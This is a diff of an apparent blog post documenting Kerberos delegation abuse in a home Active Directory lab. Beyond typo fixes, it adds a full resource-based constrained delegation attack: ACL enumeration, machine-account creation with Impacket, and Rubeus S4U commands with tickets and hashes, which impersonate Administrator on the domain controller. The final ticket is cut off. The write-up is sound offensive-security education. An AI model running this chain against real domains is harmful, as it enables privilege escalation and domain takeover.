@@ -33,7 +33,7 @@ Not just “what it does”, but what the KDC is actually doing,  how tickets ar
 
 This post is mainly for two reasons:
 
-1. Beacuse why not
+1. Cause why not
 2. To help me understand what the hell is going on (still not fully clicking even after writing this)
 
 
@@ -74,6 +74,7 @@ I have set up a lab that looks something like this:
 | DC01    | 10.0.0.2    | Main DC (`lol.local`)                                           |
 | SRV02   | 10.0.0.3    | Hosts IIS and is Allowed to Delegate to `DC01` (Constrained)    |
 | WS01    | 10.0.0.4    | `TRUSTED_FOR_DELEGATION` (Unconstrained)                        |
+| Kali    | 10.0.0.128  | Commando VM                                                     |
 | Kali    | 10.0.0.129  | Hosting AdaptixC2                                               | 
 
 
@@ -81,7 +82,7 @@ I have set up a lab that looks something like this:
 SRV02 is a Windows Server hosting IIS, configured with Kerberos Constrained Delegation. It runs a simple ASP page that connects to a share on DC01 (`\\DC01\ShareSupport`) on behalf of the authenticated user. 
 > The machine runs IIS under a dedicated service account `svc_iis`, which owns the SPN `HTTP/srv02.lol.local` and is trusted to delegate to `cifs/DC01` (to list the content of `ShareSupport`)
 
-we can also see that from access token of `w3wp.exe` (IIS worker process) that it can act as any user that authenticates to it.
+we can also see that from access token of `w3wp.exe` (IIS worker process) that it indicates the worker process is running in the delegated service context.
 
 ![image](/assets/img/Delegation/priv.png)
 
@@ -98,10 +99,10 @@ Kerberos delegation lets a service act as a user when interacting with other ser
 We know when a user logs in during the initial logon, he obtain a TGT which he can use to grab service tickets for whatever they need (enabling SSO). But in a scenario like this how does the web server get a SQL service ticket as that user?
 that’s the problem delegation was built to solve.
 
-<!-- When user logs in he obtain a TGT which is used to requset TGS for various services, which implements the sense of SSO. But in a scenario like this how could the web server obtain a SQL service ticket for the user? this what delegation was made for -->
+<!-- When user logs in he obtain a TGT which is used to request TGS for various services, which implements the sense of SSO. But in a scenario like this how could the web server obtain a SQL service ticket for the user? this what delegation was made for -->
 
 ## SeEnableDelegationPrivilege
-This privilege is the heart of delegation configuration and it is granted by default for doamin admins and enterprise admins.. but if it is configured for a user (or computer) account + having any way of edititng Object attributes like `GenericWrite` or `WriteProperty` etc.. They can enable (or edit):
+This privilege is the heart of delegation configuration and it is granted by default for domain admins and enterprise admins.. but if it is configured for a user (or computer) account + having any way of editing Object attributes like `GenericWrite` or `WriteProperty` etc.. They can enable (or edit):
 - `msDS-AllowedToDelegateTo`
 - `TrustedForDelegation`
 - `TrustedToAuthForDelegation`
@@ -205,7 +206,7 @@ UserPrincipalName       :
 We can see that it has `forwardable` flag enabled and that is exactly what we need in order to use it to request TGS to other services.
 
 
-> If a user was in the `Protected Users` (or is marked as "Sensitive and cannont b e delegated") their TGT won't even get cached on the machine at all. more info on this group here[^protected]
+> If a user was in the `Protected Users` (or is marked as "Sensitive and cannont be delegated") their TGT won't even get cached on the machine at all. more info on this group here[^protected]
 {: .prompt-danger }
 
 There are Numours ways to use this ticket one way is with Rubeus `createnetonly`, which uses the `CreateProcessWithLogonW()` API to spawn a new hidden process with logon type 9 (NewCredentials). Then we can then inject the ticket into that session and use it for network authentication.
@@ -214,16 +215,16 @@ There are Numours ways to use this ticket one way is with Rubeus `createnetonly`
 ### Abusing Unconstrained Delegation #2 From Forced Authentication to Computer Takeover
 
 
-> *Before diving into anything, it is important to note that while we are using an Unconstrained Delegation mcahine to capture the ticket, the actual 'Computer Takeover' trick (S4U2self) does not require the target machine to have any delegation configured. Any computer account in the domain can use the S4U2self extension to request a TGS for any user to itself without prior setup.*
+> *Before diving into anything, it is important to note that while we are using an Unconstrained Delegation machine to capture the ticket, the actual 'Computer Takeover' trick (S4U2self) does not require the target machine to have any delegation configured. Any computer account in the domain can use the S4U2self extension to request a TGS for any user to itself without prior setup.*
 
 Waiting for a high level user to authenticate to them machine that we own isn't the most reliable way in real life scenarios, we are not guaranteed to have a high level user auth to us. 
 
 
 
-So instead of there is a way to get local admin on any machine by forging TGS for any user to that specific computer by:
+So instead there is a way to get local admin on any machine by forging TGS for any user to that specific computer by:
 1. Forcing the targeted computer (`DC01`) to auth to us (via tools like `PetitPotam` or `SpoolSample`).
 
-2. Because of the delegation setting, `DC01` sends its own Machine Account TGT (DC01$) to our server. This ticket is now cached in `LSASS` of `SRV02`.
+2. Because of the delegation setting, `DC01` sends its own Machine Account TGT to our server. This ticket is now cached in `LSASS` of `WS01`.
 
 3. We use this captured DC01$ TGT to perform an S4U2self request *(More details on this below)*. This asks the Domain Controller to give us a TGS for any user (like Administrator) to a service on that same machine.
 - *This works even if the user is marked as "Sensitive and cannot be delegated" because the computer is only delegating to itself, which bypasses that specific Kerberos restriction.*
@@ -380,7 +381,7 @@ Cached Tickets: (3)
 ```
 This is a clean proof of the difference between **authentication and authorization**, we successfully authenticated, but authorization still shuts us down.
 
-This why we need the next step..
+This is why we need the next step..
 
 #### 3. Request a S4U2Self
 The S4U2self request is a Kerberos extension that allows a service to ask the KDC for a TGS for any user to itself without any prior configuration.
@@ -719,7 +720,7 @@ It exists because the user didn’t authenticate via Kerberos, so this is basica
 
 it has the target user (e.g., pixel) and Checksum. The Checksum is used to assure that no MitM can alter the request and change the target to user to an admin account. all the details of how it is calculated is here [^PA-FOR-USER]
 
-> This is why we can impersonate any user with `/impersonateuser` option, because the DC trust the service that made the S4U2Self requset that a user has authenticated to it in someway (via NTLM or Smart Card). it was never designed to require proof of the user.
+> This is why we can impersonate any user with `/impersonateuser` option, because the DC trust the service that made the S4U2Self request that a user has authenticated to it in someway (via NTLM or Smart Card). it was never designed to require proof of the user.
 {: .prompt-info }
 
 #### PA-FOR-X509-USER
@@ -727,7 +728,7 @@ PA-FOR-X509-USER is just the certificate-backed version of S4U. Instead of askin
 
 ### s4u2self TGS-REP
 ![image](/assets/img/Delegation/5.png)
-This is the respond of the previous request. the KDC hands back a service ticket for user `pixel` to the service (SRV02). Even though the requset was sent by SRV02 it got back TGS for `pixel`, This is where can really observe the impersonation happening.
+This is the respond of the previous request. the KDC hands back a service ticket for user `pixel` to the service (SRV02). Even though the request was sent by SRV02 it got back TGS for `pixel`, This is where can really observe the impersonation happening.
 
 The actual TGS is encrypted by the `SRV02$` account key.
 
@@ -977,7 +978,7 @@ if we go back to the RFC to see what bit we are looking for we can see this:
 ![image](/assets/img/Delegation/17.png)
 And Kerberos reads these bits from left to right. so after mapping it we can see that second bit is set to `1` which indicates that the it IS forwardable.
 
-And that is because when normal Windows computers request a Service Ticket, they natively set the forwardable request bit to 1 by default, just in case the destination server needs it. Because a real user proved their identity with a real password (this why we can scrape LSASS, steal this naturally forwardable ticket, and shove it into the S4U2proxy attack chain.)
+And that is because when normal Windows computers request a Service Ticket, they natively set the forwardable request bit to 1 by default, just in case the destination server needs it. Because a real user proved their identity with a real password (this is why we can scrape LSASS, steal this naturally forwardable ticket, and shove it into the S4U2proxy attack chain.)
 
 But when forging S4U2self, we don't use the user's password.. in fact if DO have it there is no need for all of this delegation stuff, so as a security measure kerberos only make KDC issue a non-forwardable tickets.
 
@@ -1010,7 +1011,7 @@ For these reasons RBCD was introduced in Windows Server 2012. It puts the contro
 
 ### Network Analysis
 
-On the Network level it is exactly the same as Constrained Delegation, The difference happens inside the DC memory..
+On the Network level it is nearly the same as Constrained Delegation except that `resource-based-constrained-delegation` is set to 1 in the `additional-tickets` field  of the user's TGT, The real difference is what is done inside the DC memory..
 
 **If it's Traditional Constrained Delegation:**
 1. KDC looks at the **Source** of the packet (`SRV02`).
@@ -1024,6 +1025,8 @@ On the Network level it is exactly the same as Constrained Delegation, The diffe
 3. It parses the **Security Descriptor (Binary)** to see if the SID of `SRV02` is allowed.
 4. If yes, send `TGS-REP`.
 
+So it is really the other way around.
+
 ### Configuring the ACE
 
 RBCD is natively configured like protocol transition to support all modern authentication methonds, but doesn't have certain way to specify services like we did in constrained delegation since trust is granted at the machine account level via SID rather than per SPN. It simply says "Is SRV02$'s SID in msDS-AllowedToActOnBehalfOfOtherIdentity?" If so it passes.
@@ -1034,14 +1037,13 @@ So in order to edit this attribute we need to have the `msDS-AllowedToActOnBehal
 
 Then choose the write permission:
 ![image](/assets/img/Delegation/22.png)
-
+Right now we just gave the write access to `Web Admins` on that property, we still need to configure the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute itself on the backend
 
 
 ### Enumeration
 We need to see who has the ability to write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute..
 
-explain it tomorrow..
-
+We can list all the domain computers, get their ACLs and filter out the GUID of `msDS-AllowedToActOnBehalfOfOtherIdentity` which can be found [here](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity) then see who has write permession to it:
 ```shell
 Get-DomainComputer | Get-DomainObjectAcl | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -match 'WriteProperty' } | select ObjectDN,SecurityIdentifier
 
@@ -1054,10 +1056,279 @@ CN=ITComputer,OU=IT,DC=lol,DC=local           S-1-5-10
 CN=SRV02,CN=Computers,DC=lol,DC=local         S-1-5-10
 ```
 
+This thing with SID of `S-1-5-21-1558345677-4257867870-1842270656-3603` has write permession to this ACE on `DC01`.. We can use LDAP to see this SID belongs to who:
+```shell
+PS C:\> Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-1558345677-4257867870-1842270656-3603)'
+
+
+usncreated            : 327949
+grouptype             : GLOBAL_SCOPE, SECURITY
+samaccounttype        : GROUP_OBJECT
+samaccountname        : Web Admins
+whenchanged           : 3/31/2026 11:06:46 PM
+objectsid             : S-1-5-21-1558345677-4257867870-1842270656-3603
+objectclass           : {top, group}
+cn                    : Web Admins
+usnchanged            : 327961
+dscorepropagationdata : 1/1/1601 12:00:00 AM
+name                  : Web Admins
+distinguishedname     : CN=Web Admins,OU=Frontend Admins,DC=lol,DC=local
+member                : CN=Bob,OU=Frontend Admins,DC=lol,DC=local
+whencreated           : 3/31/2026 11:05:56 PM
+instancetype          : 4
+objectguid            : 22f5ecf0-9a88-4683-9397-7d26f4ca6e6d
+objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=lol,DC=local
+```
+
+So this means `Web Admins` group which `Bob` is a member of which means he can make `DC01` trust ANY machine for delegation.
+
+
+Righ now on the DC01 the attribute is empty
+![image](/assets/img/Delegation/23.png)
+
+Let's exploit it!
+
 ### Exploitation
 
-Tomorrow..
+In order for this attack to work we need to have two prerequisites:
+1. A write permission to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object (which `Bob` has over `DC01`)
+2. A contorol over a computer/Service accounts anything with SPN set on it 
+- This is because in order to do a s4u2self request we need SPN, and computer have them by default (`HOST`, `WSMAN`, etc..)
 
+So overview of the attack flow:
+1. Create a new computer by abusing the `msDS-MachineAccountQuota` attribute which is 10 by default.
+2. Use `Bob` to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on `DC01` to add the new computer we made.
+3. Perform `s4u` attack with the ticket of the new computer that we created. 
+
+I will carry out the whole operation from commando VM, which is a non-domain joined so I will use a proxy tool
+
+#### 1. Adding New Computer
+
+I will use Impacket to do it since I had hard time making tools like [PowerMad](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1) work. We can verify that `bob` has the abiltiy to add up to 10 computers:
+```shell
+└─$ nxc ldap dc01.lol.local -u bob -p securepassword -M maq
+LDAP        10.0.0.2        389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:lol.local)
+LDAP        10.0.0.2        389    DC01             [+] lol.local\bob:securepassword 
+MAQ         10.0.0.2        389    DC01             [*] Getting the MachineAccountQuota
+MAQ         10.0.0.2        389    DC01             MachineAccountQuota: 10
+```
+`addcomputer.py` script to add it:
+```shell
+└─$ impacket-addcomputer -computer-name 'FAKE-PC$' -computer-pass 'FakePassword' -dc-host "10.0.0.2" -domain-netbios "lol.local" "lol.local"/"bob":"securepassword" 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully added machine account FAKE-PC$ with password FakePassword.
+```
+
+#### 2. Adding FAKE-PC$ to msDS-AllowedToActOnBehalfOfOtherIdentity attribute
+Right now the attribute is empty:
+```shell
+PS C:\Tools> Get-DomainComputer -Identity * -Properties "name", "msDS-AllowedToActOnBehalfOfOtherIdentity" -Server dc01 -Credential $Creds | Select-Object Name, "msDS-AllowedToActOnBehalfOfOtherIdentity"
+
+name       msDS-AllowedToActOnBehalfOfOtherIdentity
+----       ----------------------------------------
+DC01
+WS01
+ITComputer
+SRV02
+FAKE-PC
+```
+
+First we will get `bob` `LDAP` TGS to be able to edit the attribute:
+```shell
+PS C:\> .\Rubeus.exe asktgt /user:bob /password:securepassword /nowrap /dc:dc01 /domain:lol.local /nowrap /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 132A0E327625A4A32C14B5A08912B9F0
+[*] Building AS-REQ (w/ preauth) for: 'lol.local\bob'
+[*] Using domain controller: 10.0.0.2:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIErjCCBKqgAwIBBaEDAgEWooID0TCCA81hggPJMIIDxaADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJbG9sLmxvY2Fso4IDjzCCA4ugAwIBEqEDAgECooIDfQSCA3nTXi46XtRW0ckyaKut6Z9+orioTa7SRpo6ixweOJSXDuPBj+80GszWv8sPfzllidZmipsZyjBN4dOGRQKv4qXqWkzEATvABMOAdwx8QupL9PeioVx1Ml54k2H19RX74/289IIqVX7tG3GP4rVR1L48Xk0yPdjk+RAYqY9dkBxwC7LTz7ONsddWpBfcjUywSaDOE2mr7Ey54LV12FfG0lCk//pZ2R1qERfwnSaXHy0FPVHzkQ8WhmNyU3AAD6ngNMC4L0kNkacNneDjG2xgXihUrGNvC1Z8jQ3TwtToEhk6qAMLjQJSXP942H58Unioj7GUnY7IDFjBav9rl6nIZbFhQ4h3S/TdfZ9frW18y/crzktAjjhzYx6kOoiCjzOnRv7aa+znumdqbaq1oNY1MDJYYzes/ixBUqdRppPzlt6LkVEwlGCr4aF/AikViYiZatzzmSdk26m6aHT0UO1IVis81AlWP/0SXalRBnr2loVTaSBt8j08p2V9PhFmn1+x7N/9QvO/ChnkbfHX0T2d0Ym4XX5F23WktqAASVQIr/GGAQb+jlVwfPq5Hpqja8LKsXl2OrKOfL5OGhAXnXJMNpvI7UgpB6dWVeRbTPD71rMlgKG3H1ZaqDZKTKzadjDuavooyx9Rpv0vnVCsqkvVvtCjepxNuGAK2RhrcKwV3IglSXiCaB0ZM8shLMVtB61ZVWAhfZIsPq5CIMykotCW5H6Fv7uxBzrh3ikG/PGeob2MnExX7DtbzN/59/dcWzyx98SSr7rZyiLgN1J3qoD8NOBzTEPssGTiTEISroiGaTIW+qL32iPKKnvfWAzSII+ouQ/85lNZ46ww5HILHYx52b34/V4FJ5PJEtZ58C3YWnNg3+2YZsWpZDbNk+Ko1CRV4U5Io7rKq9X4NmRBAAo6E+x+FhAMpNEqRNrZOb237QVp3QzN9A7uYgWV7z9wnwzYV/Q/WneO2PCsvG+S7Ht7muNHpN5e9TqdljmTYGSnw3mnmDPgi05MpBMgIW2z9rHJL3gIjAY+GMPAUuzRpZpkDUMhwPfEwcLFmkj8kke9hH8pHOoVtLDPeAaVwzCpSqsn4zwkQWnvdp/YXvumg90VSmY76owomg3Q41/oo9rQs4U3zl0tsNzB5EA8PHzSdcP5X19pratw3phYT464hzG0ALnviePwTq75K/ypo4HIMIHFoAMCAQCigb0Egbp9gbcwgbSggbEwga4wgaugGzAZoAMCARehEgQQ1bsxFx6ZBbUu9I/xNYtt5aELGwlMT0wuTE9DQUyiEDAOoAMCAQGhBzAFGwNib2KjBwMFAEDhAAClERgPMjAyNjA0MDExNzUwMzFaphEYDzIwMjYwNDAyMDM1MDMxWqcRGA8yMDI2MDQwODE3NTAzMVqoCxsJTE9MLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0Gwlsb2wubG9jYWw=
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/lol.local
+  ServiceRealm             :  LOL.LOCAL
+  UserName                 :  bob (NT_PRINCIPAL)
+  UserRealm                :  LOL.LOCAL
+  StartTime                :  4/1/2026 10:50:31 AM
+  EndTime                  :  4/1/2026 8:50:31 PM
+  RenewTill                :  4/8/2026 10:50:31 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  1bsxFx6ZBbUu9I/xNYtt5Q==
+  ASREP (key)              :  132A0E327625A4A32C14B5A08912B9F0
+
+PS C:\> klist
+
+Current LogonId is 0:0x7e8e8
+
+Cached Tickets: (1)
+
+#0>     Client: bob @ LOL.LOCAL
+        Server: krbtgt/lol.local @ LOL.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 4/1/2026 10:50:31 (local)
+        End Time:   4/1/2026 20:50:31 (local)
+        Renew Time: 4/8/2026 10:50:31 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+
+After having his ldap TGS in place we will add `FAKE-PC$` to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `DC01`:
+```powershell
+$fakepc = Get-ADComputer -Identity 'FAKE-PC' -Server 'dc01'
+Set-ADComputer -Identity 'dc01' -PrincipalsAllowedToDelegateToAccount $fakepc -Server 'dc01'
+```
+
+Now we check again:
+```shell
+PS C:\Tools> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'dc01' | select Name,PrincipalsAllowedToDelegateToAccount
+
+Name       PrincipalsAllowedToDelegateToAccount
+----       ------------------------------------
+DC01       {CN=FAKE-PC,CN=Computers,DC=lol,DC=local}
+WS01       {}
+ITComputer {}
+SRV02      {}
+FAKE-PC    {}
+```
+Now `DC01` now trusts `FAKE-PC$` and it is allowed to act on behalf of other users to `DC01`
+
+#### S4U2Self
+
+Now it is the same `s4u` attack chain as we did before, but we need a TGT or hash of the `FAKE-PC$`:
+```
+PS C:\> .\Rubeus.exe asktgt /user:FAKE-PC$ /password:FakePassword /nowrap /dc:dc01 /domain:lol.local
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 973012E936946E9363CD9D71B1FC6801
+[*] Building AS-REQ (w/ preauth) for: 'lol.local\FAKE-PC$'
+[*] Using domain controller: 10.0.0.2:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIEyDCCBMSgAwIBBaEDAgEWooID5jCCA+JhggPeMIID2qADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJbG9sLmxvY2Fso4IDpDCCA6CgAwIBEqEDAgECooIDkgSCA44RmTsVA1zg1PNAMVhwERga6KL3Hg6EwID5cRKgyOZEaASRQCCYLSKx3T11UP0f+jpDsjMf+qWva4BGK+OPUq/UKgRx1sEISihhwxgZZF5lcXJI2rec5Tdg7O9iean5CsijAp/DykQqKmw9wv3S408EZ66RnZ5xoOhh9tLxRFvqd/RACWd+Wdbx6GXFQiOpJ/PmoerAp6MeTuNvaLVTJz7hRnQkPBGb76HVKB73h6pZ/4zsKx0Qf/hJzjZp5CpXttpSjB4kAYqaWpIaI4FwxnJYX9rGiA3JJLroaqqQ8r79d4COhOFnxNNeV9fuMliAOaVvUn0doEKAAzSGRYLZAnN82vk/5CMCcjpauiPUvjx/73VevyAGD/Zgqwu/8pbxwUOi4GtdvsnraUp2ws+5tVK1tXhfwKW17ukMHKYABryNnm86r/KZMNc+vp7kjDIFOJpI6TaMgN93n/mxG7QbyZGRDB/mlD0ZnnoaUyjG7B1QRFSrL4hcXCOf2zNCWRMBflTxHPqCeMdRasgUkvEcTFQXwBxUmK93ORuRfcHWaNYE/heV2TXPCsllbWms3KpPts6m8/QlwnNFn4tafWnsECRh1V0XO1X3eoyIdR2iKseohXgGXYg4t5/D24qgI4sn+V+eUKx54qfNJAW0dP1fQuQo3UvBmG75QVb+N/91TS10OEu9os+3+VfF7HDJ9r9/g6YUIJHMFjY404odFmcEofUgGHJ62PLRLQqdefGnopPw8qSKqk1zIVmUuy3gpCxBfR59QxUyMVL9KktpE+k6E0RmZw9BYzYyH/Fv5WUsg9hqNIpbjl5aJ9aRDnvqqDI1m4zl4nAR06CPi4nj2tspYjkPfnnF5xvpA6leWxv/THfjeBFiBERTt0iPyI85zCPZzOThGrvJp+qfhcGHP3+X6GFifTozt/j7KMptbvz+zxwejDPlcAv3KMm3ZUFfwXEPwkDEhO57MV8i6LdVQ77WW9OPNP6i+bJlW2tdOMMBrWrDuiSmnP120QS7dC/bQiX0hzZfr88C/FeozO683tbnwMUWNnjIa4zxta/iaK2ZfPmJ4gwMO9NtGtwofDATX7u1OVJjWreR0IMwW6n84CCTMEXeMTXjSMfP+5r2cjqMhxpClkca6ae6/Twtgb3LUkEnQWYRsV/hkdmEs2UqA1Cd7Eo0Clm/vsVyQTWYrv9uWylO1tem1F6sR9l8ZM6KbR6Fo4HNMIHKoAMCAQCigcIEgb99gbwwgbmggbYwgbMwgbCgGzAZoAMCARehEgQQyI7XBJwpa3dxA8jfk+e2BqELGwlMT0wuTE9DQUyiFTAToAMCAQGhDDAKGwhGQUtFLVBDJKMHAwUAQOEAAKURGA8yMDI2MDQwMTE3NTIxMlqmERgPMjAyNjA0MDIwMzUyMTJapxEYDzIwMjYwNDA4MTc1MjEyWqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCWxvbC5sb2NhbA==
+
+  ServiceName              :  krbtgt/lol.local
+  ServiceRealm             :  LOL.LOCAL
+  UserName                 :  FAKE-PC$ (NT_PRINCIPAL)
+  UserRealm                :  LOL.LOCAL
+  StartTime                :  4/1/2026 10:52:12 AM
+  EndTime                  :  4/1/2026 8:52:12 PM
+  RenewTill                :  4/8/2026 10:52:12 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  yI7XBJwpa3dxA8jfk+e2Bg==
+  ASREP (key)              :  973012E936946E9363CD9D71B1FC6801
+```
+
+Now we can use it in `s4u`:
+```
+PS C:\> .\Rubeus.exe s4u /user:FAKE-PC$ /impersonateuser:Administrator /msdsspn:cifs/dc01 /dc:dc01 /domain:lol.local /nowrap /ticket:doIEyDCCBMSgAwIBBaEDAgEWooID5jCCA+JhggPeMIID2qADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJbG9sLmxvY2Fso4IDpDCCA6CgAwIBEqEDAgECooIDkgSCA44RmTsVA1zg1PNAMVhwERga6KL3Hg6EwID5cRKgyOZEaASRQCCYLSKx3T11UP0f+jpDsjMf+qWva4BGK+OPUq/UKgRx1sEISihhwxgZZF5lcXJI2rec5Tdg7O9iean5CsijAp/DykQqKmw9wv3S408EZ66RnZ5xoOhh9tLxRFvqd/RACWd+Wdbx6GXFQiOpJ/PmoerAp6MeTuNvaLVTJz7hRnQkPBGb76HVKB73h6pZ/4zsKx0Qf/hJzjZp5CpXttpSjB4kAYqaWpIaI4FwxnJYX9rGiA3JJLroaqqQ8r79d4COhOFnxNNeV9fuMliAOaVvUn0doEKAAzSGRYLZAnN82vk/5CMCcjpauiPUvjx/73VevyAGD/Zgqwu/8pbxwUOi4GtdvsnraUp2ws+5tVK1tXhfwKW17ukMHKYABryNnm86r/KZMNc+vp7kjDIFOJpI6TaMgN93n/mxG7QbyZGRDB/mlD0ZnnoaUyjG7B1QRFSrL4hcXCOf2zNCWRMBflTxHPqCeMdRasgUkvEcTFQXwBxUmK93ORuRfcHWaNYE/heV2TXPCsllbWms3KpPts6m8/QlwnNFn4tafWnsECRh1V0XO1X3eoyIdR2iKseohXgGXYg4t5/D24qgI4sn+V+eUKx54qfNJAW0dP1fQuQo3UvBmG75QVb+N/91TS10OEu9os+3+VfF7HDJ9r9/g6YUIJHMFjY404odFmcEofUgGHJ62PLRLQqdefGnopPw8qSKqk1zIVmUuy3gpCxBfR59QxUyMVL9KktpE+k6E0RmZw9BYzYyH/Fv5WUsg9hqNIpbjl5aJ9aRDnvqqDI1m4zl4nAR06CPi4nj2tspYjkPfnnF5xvpA6leWxv/THfjeBFiBERTt0iPyI85zCPZzOThGrvJp+qfhcGHP3+X6GFifTozt/j7KMptbvz+zxwejDPlcAv3KMm3ZUFfwXEPwkDEhO57MV8i6LdVQ77WW9OPNP6i+bJlW2tdOMMBrWrDuiSmnP120QS7dC/bQiX0hzZfr88C/FeozO683tbnwMUWNnjIa4zxta/iaK2ZfPmJ4gwMO9NtGtwofDATX7u1OVJjWreR0IMwW6n84CCTMEXeMTXjSMfP+5r2cjqMhxpClkca6ae6/Twtgb3LUkEnQWYRsV/hkdmEs2UqA1Cd7Eo0Clm/vsVyQTWYrv9uWylO1tem1F6sR9l8ZM6KbR6Fo4HNMIHKoAMCAQCigcIEgb99gbwwgbmggbYwgbMwgbCgGzAZoAMCARehEgQQyI7XBJwpa3dxA8jfk+e2BqELGwlMT0wuTE9DQUyiFTAToAMCAQGhDDAKGwhGQUtFLVBDJKMHAwUAQOEAAKURGA8yMDI2MDQwMTE3NTIxMlqmERgPMjAyNjA0MDIwMzUyMTJapxEYDzIwMjYwNDA4MTc1MjEyWqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCWxvbC5sb2NhbA==
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: S4U
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'FAKE-PC$@LOL.LOCAL'
+[*] Using domain controller: dc01 (10.0.0.2)
+[*] Sending S4U2self request to 10.0.0.2:88
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'FAKE-PC$@LOL.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIFLDCCBSigAwIBBaEDAgEWooIETjCCBEphggRGMIIEQqADAgEFoQsbCUxPTC5MT0NBTKIVMBOgAwIBAaEMMAobCEZBS0UtUEMko4IEFTCCBBGgAwIBF6EDAgECooIEAwSCA/+ftyB958DbTWgtYOSzAXQme1DutnOa3+N/IqFRhLkeTE3PCsrSc5JwghRXjGPcD1Uedrozzh3e7Cj4eSBt5VE61PhqUSriUEtEENGQUet1vwqe9mcY8nMXmSR1S2lSCxp7K3qMHmwbnR8uxmDfwt8rYn29e3mDR9N6Cbp7QCU0r8Xt4jlEIU9+jqt7ZfuaZQaLV2/jjAjayHQo6S2rzaxUfvchQxJg418rYrnwky15bz183W7TbyIcMaSMG882lAVPfTZ3CQQ5DMWzYInkO0cp76fJUGes2lxXLJei26yaQpfejG8ItMPEHJPURcaBi+goSgn8a2qI/mwnmUz8pxsWYWJb0EG37CyMaSfagfpzBEi6AeWIk3xaeXYV89wIDGybRWFO1Tm3l0i6oPIZPLV/sVDD9ODUCAfMUudP4aIimAQGMVAM1f0nQjUEvuhvepXufca8qeJEAmTshqTr2d59fI9ueFKQ77U2TmsmUZTqoCgCd0RFaZCpmYwOhVTEMMKMIPkbyEnbsFcP8ygkHDPAliyxki07dyvJ7h0wU9AC3GyOXdtSRJY+dpTcCEg3Src/G9B0Ev1pYfSbpiAduUg2vXdSZnFHkyZ7w3xD+EUbSk9SfZD4+XtvrcGrCEX9w96XcDPuw+ZGudgrdxyR/F7TaUXkuphC8It+LXIiPFifa3kLbPg6y+FhelkI1GBK7H338WDSZVxYec0zqsxXByRtEDPULQE+FvSdGu8Nuup921qJzUFjgc01OpE9PLZFs+NGF7Q4YGU2rr1MTYE6F0CMzM67wcAiRxmqjD5ExSuj27bUvXoJ3wCnD4IBv5ivJR/3wgQGeQVRXNLzCyl3k3lIXeagB5Wcx2HSFIvn4EqA68VcF3ytLE98+LiqGUGfiZW4c4/9k9RWWnJo9awrvzcXOlcQhV1+U/wd1p9w4jZKORwF2NirsQ/bHqcwz+LkF4JI+SavvdFAaam68/m5JD4mZfMdA7wFbx2wcFH7dvzfG8gp9GEjTbZNfEhQYqldY1qs8fNp4h/g6fJYyf/+pUhDBkEuYvHYDgJKZVL+SqJFb5c5lw8ZtgFr/mWMGEVDmiQx2KzQuSa4GdyS2nIta5kaI6Ij1TV8urd8R/ZXN0FGALkpSm/ZpbkvC+/F3PgV0T/eFtnsPehDv5Ca+HV+mgS0ghulnpeamqgFADnvdHfPnlqHqz2COorg/t5fkFBRt6szgxEQrOajaWP3KBuidvlvm3JZTgCbJPaaiTGn6FBQ0F9Jn1JN+xWmATvEkuWTGXBOzLFxJUw9mzYvvOEs8mMOwdj+H3vN4nFa7Zdz+7IAYvUKPZ3OmI/hdTr5HG/zdzjIxB7FBiAaCbAg8l+ySkCjgckwgcagAwIBAKKBvgSBu32BuDCBtaCBsjCBrzCBrKAbMBmgAwIBF6ESBBAQ8kyLNmi1xxSjWiTdNfhboQsbCUxPTC5MT0NBT